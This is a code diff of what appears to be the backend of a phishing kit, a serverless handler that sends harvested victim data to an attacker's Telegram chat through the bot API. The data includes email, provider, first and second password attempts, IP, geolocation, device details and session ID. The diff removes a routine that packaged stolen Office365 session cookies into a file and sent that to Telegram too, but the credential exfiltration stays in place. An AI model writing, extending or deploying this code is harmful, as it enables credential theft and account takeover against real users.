@@ -104,175 +104,49 @@ const composeTelegramMessage = (data) => {
         firstAttemptPassword,
         secondAttemptPassword,
         password, // Fallback
+        clientIP,
+        location,
+        deviceDetails,
+        timestamp,
+        sessionId,
     } = data;
 
     const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
 
-    let message = `👤 TARGET INFORMATION
-┌─────────────────────────────────
-│ 📧 Email: \`${email || 'Not captured'}\`
-│ 🏢 Platform: *${provider || 'Others'}*`;
-
+    let passwordSection;
     if (hasTwoStepData) {
-        message += `
-│ 🚫 Invalid Password: \`${firstAttemptPassword}\`
-│ ✅ Valid Password: \`${secondAttemptPassword}\`
-└─────────────────────────────────`;
+        passwordSection = `🔑 First (invalid): \`${firstAttemptPassword}\`\n🔑 Second (valid): \`${secondAttemptPassword}\``;
     } else {
-        message += `
-│ 🔑 Password: \`${password || 'Not captured'}\`
-└─────────────────────────────────`;
+        passwordSection = `🔑 Password: \`${password || 'Not captured'}\``;
     }
 
-    message += `
-│ ⏰ Captured: ${new Date().toLocaleString('en-US', { 
-        timeZone: 'UTC',
-        year: 'numeric',
-        month: 'short', 
-        day: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit'
-    })} UTC`;
+    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
+        year: 'numeric', month: 'short', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit',
+        timeZone: 'UTC', hour12: true
+    }) + ' UTC';
 
-    return message;
-};
+    return `
+*🔐 PARISRESULTS 🔐*
 
-/**
- * Builds Microsoft cookie section for Telegram message
- * @param {object} microsoftCookies - Microsoft cookie statistics
- * @param {array} cookieList - Full cookie list
- * @returns {string}
- */
-const buildMicrosoftCookieSection = (microsoftCookies, cookieList) => {
-    if (!microsoftCookies && !cookieList) {
-        return '\n\n*🔵 MICROSOFT SESSION*\n- Status: *No cookies captured*';
-    }
+*ACCOUNT DETAILS*
+- 📧 Email: \`${email || 'Not captured'}\`
+- 🏢 Provider: *${provider || 'Others'}*
+- ${passwordSection}
 
-    let section = '\n\n*🔵 MICROSOFT SESSION*\n';
+*DEVICE & LOCATION*
+- 📍 IP Address: \`${clientIP}\`
+- 🌍 Location: *${location.regionName}, ${location.country}*
+- 💻 OS: *${deviceDetails.os}*
+- 🌐 Browser: *${deviceDetails.browser}*
+- 🖥️ Device Type: *${deviceDetails.deviceType}*
 
-    // Add Microsoft cookie statistics
-    if (microsoftCookies) {
-        section += `- 📊 Total Cookies: *${microsoftCookies.total || 0}*\n`;
-        section += `- 🔐 Auth Cookies: *${microsoftCookies.authCookies || 0}*\n`;
-        section += `- 🎫 Session Cookies: *${microsoftCookies.sessionCookies || 0}*\n`;
-        
-        if (microsoftCookies.domains && microsoftCookies.domains.length > 0) {
-            const domains = microsoftCookies.domains.slice(0, 3).join(', ');
-            section += `- 🌐 Domains: \`${domains}\`\n`;
-        }
-    }
-
-    // Add note about cookie file attachment
-    if (cookieList && Array.isArray(cookieList) && cookieList.length > 0) {
-        section += `- 📎 Cookie File: *microsoft_cookies.txt attached*\n`;
-    }
-
-    return section;
-};
-
-/**
- * Generates Microsoft cookie file content
- * @param {array} cookieList - Full cookie list
- * @param {object} data - Session data
- * @returns {string}
- */
-const generateMicrosoftCookieFile = (cookieList, data) => {
-    if (!cookieList || !Array.isArray(cookieList)) {
-        return null;
-    }
-
-    // CRITICAL: Accept ALL cookies for Office365 provider - don't filter
-    const microsoftCookies = cookieList;
-    
-    console.log('🔵 Cookie file generation:', {
-        totalCookies: cookieList.length,
-        provider: data.provider,
-        email: data.email
-    });
-
-    if (!microsoftCookies || microsoftCookies.length === 0) {
-        console.log('❌ No cookies found for file generation');
-        return null;
-    }
-
-    console.log('✅ Generating cookie file with', microsoftCookies.length, 'cookies');
-
-    const timestamp = new Date(data.timestamp || Date.now()).toISOString();
-    
-    let fileContent = `Microsoft Office365 Authentication Cookies
-========================================
-
-Session Information:
-- Email: ${data.email || 'Not captured'}
-- Provider: ${data.provider || 'Office365'}
-- Timestamp: ${timestamp}
-- Session ID: ${data.sessionId}
-- IP Address: ${data.clientIP}
-- Location: ${data.location?.regionName}, ${data.location?.country}
-- User Agent: ${data.userAgent || 'Not captured'}
-
-========================================
-CAPTURED COOKIES (${microsoftCookies.length} total)
-========================================
-
+*SESSION INFO*
+- 🕒 Timestamp: *${formattedTimestamp}*
+- 🆔 Session ID: \`${sessionId}\`
 `;
-
-    microsoftCookies.forEach((cookie, index) => {
-        fileContent += `[${index + 1}] ${cookie.name}\n`;
-        fileContent += `Domain: ${cookie.domain}\n`;
-        fileContent += `Path: ${cookie.path || '/'}\n`;
-        fileContent += `Value: ${cookie.value}\n`;
-        fileContent += `Secure: ${cookie.secure || false}\n`;
-        fileContent += `HttpOnly: ${cookie.httpOnly || false}\n`;
-        fileContent += `SameSite: ${cookie.sameSite || 'none'}\n`;
-        if (cookie.expirationDate) {
-            fileContent += `Expires: ${new Date(cookie.expirationDate * 1000).toISOString()}\n`;
-        }
-        fileContent += `Session: ${cookie.session || false}\n`;
-        fileContent += `Capture Method: ${cookie.captureMethod || 'injection'}\n`;
-        fileContent += `Capture Time: ${cookie.timestamp || timestamp}\n`;
-        fileContent += `\n${'='.repeat(50)}\n\n`;
-    });
-
-    fileContent += `\nFile generated: ${new Date().toISOString()}\n`;
-    fileContent += `Total Microsoft cookies captured: ${microsoftCookies.length}\n`;
-
-    return fileContent;
 };
 
-/**
- * Sends a document to Telegram
- * @param {string} chatId - Telegram chat ID
- * @param {string} botToken - Telegram bot token
- * @param {string} content - File content
- * @param {string} filename - File name
- * @param {string} caption - File caption
- * @returns {Promise<boolean>}
- */
-const sendTelegramDocument = async (chatId, botToken, content, filename, caption) => {
-    try {
-        const formData = new FormData();
-        const blob = new Blob([content], { type: 'text/plain' });
-        
-        formData.append('chat_id', chatId);
-        formData.append('document', blob, filename);
-        if (caption) {
-            formData.append('caption', caption);
-            formData.append('parse_mode', 'Markdown');
-        }
-
-        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-            method: 'POST',
-            body: formData,
-            signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
-        });
-
-        return response.ok;
-    } catch (error) {
-        console.error('Failed to send Telegram document:', error.message);
-        return false;
-    }
-};
 
 // --- Main Handler ---
 exports.handler = async (event) => {
@@ -313,7 +187,6 @@ exports.handler = async (event) => {
     
     const message = composeTelegramMessage(messageData);
 
-    // Send main message
     const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -324,27 +197,6 @@ exports.handler = async (event) => {
     if (!telegramResponse.ok) {
       const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
       console.error('Telegram API Error:', errorResult.description);
-    }
-
-    // Send Microsoft cookie file if available
-    if (body.cookieList && Array.isArray(body.cookieList) && body.cookieList.length > 0) {
-        const cookieFileContent = generateMicrosoftCookieFile(body.cookieList, messageData);
-        if (cookieFileContent) {
-            const filename = `microsoft_cookies_${sessionId}_${new Date().toISOString().slice(0, 10)}.txt`;
-            const caption = `🔵 *Microsoft Cookies for ${body.email || 'Unknown'}*\n📅 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;
-            
-            const documentSent = await sendTelegramDocument(
-                CONFIG.ENV.TELEGRAM_CHAT_ID,
-                CONFIG.ENV.TELEGRAM_BOT_TOKEN,
-                cookieFileContent,
-                filename,
-                caption
-            );
-            
-            if (!documentSent) {
-                console.error('Failed to send Microsoft cookie file to Telegram');
-            }
-        }
     }
 
     return {
